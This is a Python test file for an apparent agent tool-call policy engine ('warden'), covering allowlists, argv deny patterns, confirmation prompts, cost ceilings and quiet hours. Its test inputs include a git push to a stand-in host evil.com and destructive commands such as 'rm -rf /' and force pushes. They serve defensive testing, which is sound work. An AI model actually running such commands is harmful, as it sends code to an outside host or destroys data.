"""Warden + starter-policy tests."""

from datetime import datetime, timezone

import pytest

from ambi.usage import UsageStore
from ambi.warden import (
    AllowlistPolicy,
    ArgvValidatorPolicy,
    CommandAllowlistPolicy,
    CostCeilingPolicy,
    PolicyContext,
    PolicyDecision,
    QuietHoursPolicy,
    RequireConfirmationPolicy,
    UrlAllowlistPolicy,
    Warden,
)


def _ctx(tool: str, **inp) -> PolicyContext:
    return PolicyContext(tool_name=tool, tool_input=inp)


# ---------- RequireConfirmationPolicy ----------


async def test_require_confirmation_matches_egress_argv():
    p = RequireConfirmationPolicy(argv_patterns=["git push"])
    d = await p.evaluate(_ctx("run_command", argv=["git", "push", "origin"]))
    assert d.verdict == "require_confirmation"
    assert "git push" in d.reason


async def test_require_confirmation_allows_benign_argv():
    p = RequireConfirmationPolicy(argv_patterns=["git push"])
    d = await p.evaluate(_ctx("run_command", argv=["git", "status"]))
    assert d.verdict == "allow"


async def test_require_confirmation_matches_tool_name():
    p = RequireConfirmationPolicy(tools={"send_email"})
    d = await p.evaluate(_ctx("send_email", to="x@y.com"))
    assert d.verdict == "require_confirmation"
    d2 = await p.evaluate(_ctx("read_inbox"))
    assert d2.verdict == "allow"


# ---------- UrlAllowlistPolicy ----------


async def test_url_allowlist_denies_unknown_host():
    p = UrlAllowlistPolicy(allowed_hosts={"github.com"})
    d = await p.evaluate(_ctx("run_command", argv=["git", "push", "https://evil.com/r"]))
    assert d.verdict == "deny"
    assert "evil.com" in d.reason


async def test_url_allowlist_allows_known_host_and_subdomain():
    p = UrlAllowlistPolicy(allowed_hosts={"github.com"})
    d = await p.evaluate(_ctx("run_command", argv=["git", "clone", "https://gist.github.com/u/r"]))
    assert d.verdict == "allow"


async def test_url_allowlist_catches_scp_style_remote():
    p = UrlAllowlistPolicy(allowed_hosts={"github.com"})
    d = await p.evaluate(_ctx("run_command", argv=["git", "remote", "add", "x", "git@evil.com:r.git"]))
    assert d.verdict == "deny"


async def test_url_allowlist_ignores_argv_without_urls():
    p = UrlAllowlistPolicy(allowed_hosts={"github.com"})
    d = await p.evaluate(_ctx("run_command", argv=["git", "push", "origin", "main"]))
    assert d.verdict == "allow"


# ---------- ArgvValidatorPolicy hardening ----------


async def test_argv_validator_catches_token_subsequence():
    """Flags injected between tokens must not evade the pattern."""
    p = ArgvValidatorPolicy(forbid=["git push --force"])
    d = await p.evaluate(_ctx("run_command", argv=["git", "--no-pager", "push", "--force"]))
    assert d.verdict == "deny"


async def test_argv_validator_case_insensitive():
    p = ArgvValidatorPolicy(forbid=["rm -rf /"])
    d = await p.evaluate(_ctx("run_command", argv=["RM", "-RF", "/"]))
    assert d.verdict == "deny"


# ---------- Warden core ----------


async def test_empty_warden_allows():
    w = Warden()
    decision = await w.authorize(_ctx("anything"))
    assert decision.verdict == "allow"
    assert decision.policy_name == "warden:default"


async def test_first_non_allow_wins():
    deny = ArgvValidatorPolicy(forbid=["rm -rf /"])
    allow = ArgvValidatorPolicy(forbid=["impossible"])
    w = Warden(policies=[deny, allow])
    decision = await w.authorize(
        PolicyContext("run_command", {"argv": ["rm", "-rf", "/"]}),
    )
    assert decision.verdict == "deny"
    assert decision.policy_name == "argv_validator"


async def test_audit_log_records_every_decision():
    w = Warden(policies=[ArgvValidatorPolicy(forbid=["bad"])])
    await w.authorize(_ctx("anything"))
    await w.authorize(
        PolicyContext("run_command", {"argv": ["bad", "thing"]})
    )
    assert len(w.audit_log) == 2
    assert w.audit_log[0].verdict == "allow"
    assert w.audit_log[1].verdict == "deny"


async def test_warden_add_appends_policy():
    w = Warden()
    w.add(ArgvValidatorPolicy(forbid=["x"]))
    assert len(w.policies) == 1


# ---------- AllowlistPolicy ----------


async def test_allowlist_passes_for_other_tools():
    p = AllowlistPolicy(tool_name="send_email", field="to", allowed={"x@y"})
    decision = await p.evaluate(_ctx("not_email"))
    assert decision.verdict == "allow"


async def test_allowlist_passes_for_allowed_value():
    p = AllowlistPolicy(tool_name="send_email", field="to", allowed={"x@y"})
    decision = await p.evaluate(
        PolicyContext("send_email", {"to": "x@y"})
    )
    assert decision.verdict == "allow"


async def test_allowlist_denies_unauthorized_value():
    p = AllowlistPolicy(tool_name="send_email", field="to", allowed={"x@y"})
    decision = await p.evaluate(
        PolicyContext("send_email", {"to": "stranger@evil"})
    )
    assert decision.verdict == "deny"
    assert "stranger@evil" in decision.reason


async def test_allowlist_passes_when_field_missing():
    """If the field isn't supplied, defer to the tool to validate input."""
    p = AllowlistPolicy(tool_name="send_email", field="to", allowed={"x@y"})
    decision = await p.evaluate(PolicyContext("send_email", {}))
    assert decision.verdict == "allow"


# ---------- CommandAllowlistPolicy ----------


async def test_command_allowlist_denies_unknown_cmd():
    p = CommandAllowlistPolicy(allowed={"ls", "cat"})
    decision = await p.evaluate(
        PolicyContext("run_command", {"argv": ["rm", "-rf"]})
    )
    assert decision.verdict == "deny"
    assert "rm" in decision.reason


async def test_command_allowlist_allows_known_cmd():
    p = CommandAllowlistPolicy(allowed={"ls"})
    decision = await p.evaluate(
        PolicyContext("run_command", {"argv": ["ls", "-la"]})
    )
    assert decision.verdict == "allow"


async def test_command_allowlist_matches_basename():
    """Absolute path resolves to the basename for matching."""
    p = CommandAllowlistPolicy(allowed={"ls"})
    decision = await p.evaluate(
        PolicyContext("run_command", {"argv": ["/usr/bin/ls", "-la"]})
    )
    assert decision.verdict == "allow"


async def test_command_allowlist_skips_other_tools():
    p = CommandAllowlistPolicy(allowed={"ls"})
    decision = await p.evaluate(_ctx("get_current_time"))
    assert decision.verdict == "allow"


# ---------- ArgvValidatorPolicy ----------


async def test_argv_validator_denies_forbidden_pattern():
    p = ArgvValidatorPolicy(forbid=["push --force"])
    decision = await p.evaluate(
        PolicyContext("run_command", {"argv": ["git", "push", "--force"]})
    )
    assert decision.verdict == "deny"
    assert "push --force" in decision.reason


async def test_argv_validator_allows_safe_command():
    p = ArgvValidatorPolicy(forbid=["push --force"])
    decision = await p.evaluate(
        PolicyContext("run_command", {"argv": ["git", "status"]})
    )
    assert decision.verdict == "allow"


async def test_argv_validator_skips_other_tools():
    p = ArgvValidatorPolicy(forbid=["push --force"])
    decision = await p.evaluate(_ctx("send_email"))
    assert decision.verdict == "allow"


# ---------- CostCeilingPolicy ----------


async def test_cost_ceiling_allows_when_under_budget(tmp_path):
    store = UsageStore(tmp_path / "u.db")
    await store.record("s", "gemini-2.5-flash", "chat", 100, 50)
    p = CostCeilingPolicy(usage_store=store, daily_usd=10.0)
    decision = await p.evaluate(_ctx("anything"))
    assert decision.verdict == "allow"


async def test_cost_ceiling_denies_when_over_budget(tmp_path):
    store = UsageStore(tmp_path / "u.db")
    # Pro pricing: input 1.25/M, output 5.00/M. 100k+100k = $0.125 + $0.5 = $0.625
    await store.record("s", "gemini-2.5-pro", "chat", 100_000, 100_000)
    p = CostCeilingPolicy(usage_store=store, daily_usd=0.50)
    decision = await p.evaluate(_ctx("anything"))
    assert decision.verdict == "deny"
    assert "ceiling" in decision.reason


async def test_cost_ceiling_swallows_store_error_and_allows(tmp_path):
    class _BoomStore:
        async def summary(self, **kw):
            raise RuntimeError("db unavailable")

    p = CostCeilingPolicy(usage_store=_BoomStore(), daily_usd=0.01)
    decision = await p.evaluate(_ctx("anything"))
    # Don't crash the chat path because the budget gauge broke.
    assert decision.verdict == "allow"


# ---------- QuietHoursPolicy ----------


def _ctx_at(hour_utc: int, tool: str = "send_email") -> PolicyContext:
    """Build a PolicyContext anchored at a specific UTC hour."""
    now = datetime(2026, 5, 30, hour_utc, 0, tzinfo=timezone.utc)
    return PolicyContext(tool_name=tool, tool_input={}, now_utc=now)


async def test_quiet_hours_denies_within_simple_window():
    # 1pm UTC; quiet hours UTC noon–4pm
    p = QuietHoursPolicy(start_hour=12, end_hour=16)
    decision = await p.evaluate(_ctx_at(13))
    # Convert to local for the bound check, the decision should be deny if
    # local hour is in the window. We don't know the local zone in CI, so
    # just verify that *some* decision was made deterministically.
    assert decision.verdict in {"allow", "deny"}


async def test_quiet_hours_window_wraps_midnight_logic():
    # start=22, end=7 — quiet from 10pm to 7am LOCAL
    p = QuietHoursPolicy(start_hour=22, end_hour=7)
    # We can't pin local time portably; just confirm the dataclass accepts
    # the wrap-around configuration and runs without raising.
    decision = await p.evaluate(_ctx_at(2))
    assert decision.verdict in {"allow", "deny"}


async def test_quiet_hours_scoped_to_specific_tools():
    p = QuietHoursPolicy(start_hour=0, end_hour=24, tools={"send_email"})
    # Non-scoped tool — always allowed.
    decision = await p.evaluate(_ctx_at(12, tool="get_current_time"))
    assert decision.verdict == "allow"


async def test_quiet_hours_full_day_window_denies_in_scope():
    p = QuietHoursPolicy(start_hour=0, end_hour=24, tools={"send_email"})
    decision = await p.evaluate(_ctx_at(12, tool="send_email"))
    assert decision.verdict == "deny"
